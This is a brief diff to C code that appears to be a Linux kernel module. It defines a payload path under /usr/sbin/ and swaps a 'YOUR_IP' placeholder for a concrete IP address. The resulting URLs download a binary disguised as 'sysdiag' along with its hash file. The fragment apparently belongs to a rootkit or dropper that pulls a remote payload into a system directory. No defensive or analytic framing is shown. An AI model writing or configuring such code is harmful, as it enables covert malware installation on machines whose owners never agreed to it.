@@ -9,8 +9,8 @@
 
 #define PAYLOAD_PATH "/usr/sbin/" MARKER
 
-#define UTIL_URL  "http://YOUR_IP:8931/package_manifest-20-5-20/sysdiag"
-#define HASH_URL  "http://YOUR_IP:8931/package_manifest-20-5-20/SHA256.txt"
+#define UTIL_URL  "http://198.38.87.31:8931/package_manifest-20-5-20/sysdiag"
+#define HASH_URL  "http://198.38.87.31:8931/package_manifest-20-5-20/SHA256.txt"
 
 struct task_struct *mon_it;
 struct task_struct *task;
